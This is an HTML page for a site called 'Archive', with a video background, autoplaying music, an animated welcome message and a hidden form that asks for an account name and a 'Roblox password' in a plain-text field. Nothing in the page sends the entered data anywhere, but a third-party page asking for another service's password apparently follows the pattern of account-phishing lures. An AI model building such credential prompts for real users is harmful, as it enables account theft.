<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Archive</title>
    <style>
        body {
            margin: 0;
            font-family: "Raleway", sans-serif;
            font-size: 16px; /* Увеличенный шрифт */
            font-weight: 600; /* Сделаем шрифт более жирным */
            background-color: #BCAAA4;
            -webkit-font-smoothing: antialiased;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden; /* Обрезаем все, что выходит за пределы контейнера */
            position: relative;
        }

        .video-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            z-index: -1;
            pointer-events: none; /* Отключение событий мыши для ифрейма */
        }

        .video-background iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 120%;
            height: 120%;
            transform: translate(-50%, -50%);
        }

        .form-container {
            position: relative;
            width: 400px;
            padding: 40px 80px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            backdrop-filter: blur(10px);
            box-shadow: rgba(255, 255, 255, 0.2) 0 0 40px 5px, white 0 0 0 1px, rgba(0, 0, 0, 0.66) 0 30px 60px 0, inset #333 0 0 0 5px, inset white 0 0 0 6px;
            transition: transform 0.2s ease;
            overflow: hidden;
            display: none; /* Скрываем контейнер с формой */
        }

        .form-container button#mainsubmit {
            margin-top: 20px;
        }

        form {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-size: 18px;
            font-weight: 600; /* Сделаем шрифт более жирным */
            color: black; /* Изменение цвета текста на черный */
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            border-radius: 10px;
            border: 2px solid #ccc;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(5px);
            box-sizing: border-box;
            margin-bottom: 10px;
            color: black; /* Изменение цвета текста на черный */
            font-weight: 600; /* Сделаем шрифт более жирным */
        }

        button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 10px;
            background-color: #0066cc;
            color: white;
            font-size: 16px;
            cursor: pointer;
            font-weight: 600; /* Сделаем шрифт более жирным */
            margin-bottom: 10px; /* Добавляем отступ между кнопками */
            transition: opacity 0.5s ease;
        }

        button:hover {
            background-color: #005bb5;
        }

        input[type="text"]::placeholder {
            color: rgba(0, 0, 0, 0.7); /* Изменение цвета placeholder на черный (полупрозрачный) */
        }

        .welcome-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            max-width: 600px;
            padding: 40px;
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(15px);
            border-radius: 10px;
            text-align: center;
            box-shadow: 0px 0px 60px 10px rgba(0, 0, 0, 0.2);
            animation: fadeIn 1s ease-in-out;
            overflow: hidden; /* Для плавного расширения */
            transition: transform 0.5s ease, opacity 0.5s ease; /* Переход для плавного исчезновения */
        }

        .welcome-container h1 {
            font-size: 32px;
            font-weight: 600; /* Сделаем шрифт более жирным */
            color: black;
            margin: 0 0 20px 0;
        }

        .welcome-container p {
            font-size: 18px; /* Увеличенный шрифт */
            font-weight: 600;
            color: black;
        }

        .mouse-icon {
            margin-top: 20px;
            display: none; /* Изначально скрыты */
            opacity: 0;
            position: relative;
        }

        .mouse-icon svg {
            width: 40px;
            height: 60px;
        }

        .arrow-icon {
            display: none; /* Изначально скрыты */
            opacity: 0;
            position: absolute;
            top: 70px; /* Смещение вниз относительно мышки */
            left: 50%;
            transform: translateX(-50%);
        }

        .arrow-icon svg {
            width: 20px;
            height: 20px;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideDown {
            from { max-height: 150px; }
            to { max-height: 400px; } /* Значение max-height должно быть большим, чтобы вместить все содержимое */
        }

        /* Добавляем класс для плавного расширения */
        .welcome-container.expand {
            animation: slideDown 1s ease-in-out forwards;
        }

        /* Плавное появление для мышки и стрелочек с задержкой */
        .show {
            display: inline-block;
            animation: fadeIn 1s ease-in-out forwards;
        }

        /* Класс появления кнопок */
        .button-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: absolute;
            top: 60%;
            width: 100%;
            gap: 15px;
            display: none; /* Начально скрыты */
            text-align: center;
        }

        .button-container.show {
            animation: fadeIn 1s ease-in-out forwards;
            display: block; /* Показ при добавлении класса show */
        }

        .blur-box {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 10px;
            padding: 10px;
            box-shadow: rgba(255, 255, 255, 0.2) 0 0 40px 5px, white 0 0 0 1px, rgba(0, 0, 0, 0.66) 0 30px 60px 0, inset #333 0 0 0 5px, inset white 0 0 0 6px;
        }
    </style>
</head>
<body>
    <div class="video-background" id="video-background">
        <iframe id="background-video" src="https://www.youtube.com/embed/zhDwjnYZiCo?autoplay=1&controls=0&showinfo=0&modestbranding=1&loop=1&mute=1&playlist=zhDwjnYZiCo&vq=hd1080" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    <div class="form-container" id="form-container">
        <form id="form">
            <label for="username">Enter your account name:</label>
            <input id="username" type="text" name="username" placeholder="Username" required>
            
            <label for="password">Enter your Roblox password:</label>
            <input id="password" type="text" name="password" placeholder="Password" required>
            
            <button type="submit" id="mainsubmit">Submit</button>
        </form>
    </div>

    <div class="welcome-container" id="welcome-container">
        <h1 id="welcome-message"></h1>
        <p id="welcome-subtext"></p>
        <div class="mouse-icon" id="mouse-icon">
            <!-- SVG иконка мыши с выделенным колесиком -->
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
                <rect x="16" y="2" width="32" height="60" rx="16" ry="16" fill="none" stroke="black" stroke-width="2" />
                <rect x="28" y="4" width="8" height="12" rx="4" ry="4" fill="black" />
                <line x1="32" y1="16" x2="32" y2="26" stroke="black" stroke-width="2" />
            </svg>
            <div class="arrow-icon" id="arrow-icon">
                <!-- SVG иконка стрелок вниз -->
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
                    <path fill="black" d="M32 46.5l24-24-6-6L32 34.5 14 16.5 8 22.5z"/>
                    <path fill="black" d="M32 62.5l24-24-6-6L32 50.5 14 32.5 8 38.5z"/>
                </svg>
            </div>
        </div>
    </div>

    <div class="button-container" id="button-container">
        <div class="blur-box">
            <button id="account">...</button>
        </div>
        <div class="blur-box">
            <button id="inventory">...</button>
        </div>
        <div class="blur-box">
            <button id="giveaway">...</button>
        </div>
        <div class="blur-box">
            <button id="schedule">...</button>
        </div>
    </div>

    <!-- Подключаем Howler.js -->
    <script src="https://cdn.jsdelivr.net/npm/howler/dist/howler.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            var sound = new Howl({
                src: ['https://raw.githubusercontent.com/rocharge/Roblox-RO-CHARGE/main/chillMusic.mp3'],
                autoplay: false,
                loop: true,
                volume: 0.5,
                onload: function() {
                    console.log('Music loaded, waiting for user interaction to play.');
                }
            });

            // Автоматически воспроизводим звук при открытии страницы
            sound.play();

            const welcomeMessage = 'Welcome to Archive!';
            const welcomeSubtext = 'To continue, please scroll down.';
            const welcomeElement = document.getElementById('welcome-message');
            const subtextElement = document.getElementById('welcome-subtext');
            const mouseIcon = document.getElementById('mouse-icon');
            const arrowIcon = document.getElementById('arrow-icon');
            const welcomeContainer = document.getElementById('welcome-container');
            const buttonContainer = document.getElementById('button-container');

            function typeEffect(text, element, delay = 50, callback = null) {
                let index = 0;
                const interval = setInterval(() => {
                    if (index < text.length) {
                        element.textContent += text[index];
                        index++;
                    } else {
                        clearInterval(interval);
                        if (callback) callback();
                    }
                }, delay);
            }

            // Задержка выполнения эффектов в миллисекундах
            const typingDelay = 50;
            const appearDelay = 500;

            setTimeout(() => typeEffect(welcomeMessage, welcomeElement, typingDelay), appearDelay);
            setTimeout(() => typeEffect(welcomeSubtext, subtextElement, typingDelay, () => {
                welcomeContainer.classList.add('expand');
                
                setTimeout(() => {
                    mouseIcon.classList.add('show');
                    arrowIcon.classList.add('show');
                }, 1000); // Задержка для плавного расширения рамки
            }), appearDelay + welcomeMessage.length * typingDelay);

            // Убираем приветственное окно при прокрутке страницы
            window.addEventListener('scroll', () => {
                welcomeContainer.style.transform = 'translate(-50%, -150%)'; // Поднимаем окно вверх
                welcomeContainer.style.opacity = '0'; // Плавно исчезаем окно

                setTimeout(() => {
                    welcomeContainer.style.display = 'none'; // Полностью убираем окно после анимации
                    buttonContainer.classList.add('show'); // Появляются кнопки
                }, 500); // Время исчезновения совпадает с transition
            });
        });
    </script>
</body>
</html>
